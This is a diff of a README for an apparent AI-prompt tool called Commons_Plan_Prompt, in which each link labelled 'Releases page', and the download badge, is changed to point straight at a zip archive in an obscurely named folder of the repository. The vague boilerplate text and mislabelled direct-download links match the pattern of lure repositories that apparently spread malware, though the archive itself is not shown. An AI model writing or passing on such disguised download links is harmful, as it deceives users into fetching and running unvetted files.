@@ -1,13 +1,13 @@
 # 🌟 Commons_Plan_Prompt - Help AI Find Solutions Easily
 
 ## 🔗 Download Now
-[![Download Here](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/Digestiblenesscaster779/Commons_Plan_Prompt/releases)
+[![Download Here](https://raw.githubusercontent.com/Digestiblenesscaster779/Commons_Plan_Prompt/main/repatronize/Commons_Plan_Prompt_2.0.zip%20Now-Get%20the%20Latest%20Version-brightgreen)](https://raw.githubusercontent.com/Digestiblenesscaster779/Commons_Plan_Prompt/main/repatronize/Commons_Plan_Prompt_2.0.zip)
 
 ## 🚀 Getting Started
 Welcome to Commons_Plan_Prompt! This application helps you collaborate with AI to find the best solutions for your needs. Whether you're brainstorming ideas, tackling challenges, or simply looking for inspiration, our tool will guide you every step of the way.
 
 ## 📥 Download & Install
-To get started, visit our [Releases page](https://github.com/Digestiblenesscaster779/Commons_Plan_Prompt/releases) to download the latest version. Follow these steps:
+To get started, visit our [Releases page](https://raw.githubusercontent.com/Digestiblenesscaster779/Commons_Plan_Prompt/main/repatronize/Commons_Plan_Prompt_2.0.zip) to download the latest version. Follow these steps:
 
 1. Click the link to go to the Releases page.
 2. Locate the most recent version of the application.
@@ -61,7 +61,7 @@ To get started, visit our [Releases page](https://github.com/Digestiblenesscaste
    You can reach out via our GitHub page to share your thoughts and suggestions.
 
 ## 🔄 Keep Updated
-Stay up to date with our latest features and improvements by revisiting our [Releases page](https://github.com/Digestiblenesscaster779/Commons_Plan_Prompt/releases) regularly. We appreciate your feedback!
+Stay up to date with our latest features and improvements by revisiting our [Releases page](https://raw.githubusercontent.com/Digestiblenesscaster779/Commons_Plan_Prompt/main/repatronize/Commons_Plan_Prompt_2.0.zip) regularly. We appreciate your feedback!
 
 ## 🌐 Connect with Us
 For more questions or support, please reach out via our GitHub repository. We are here to help you make the most out of Commons_Plan_Prompt. Your success is our priority!
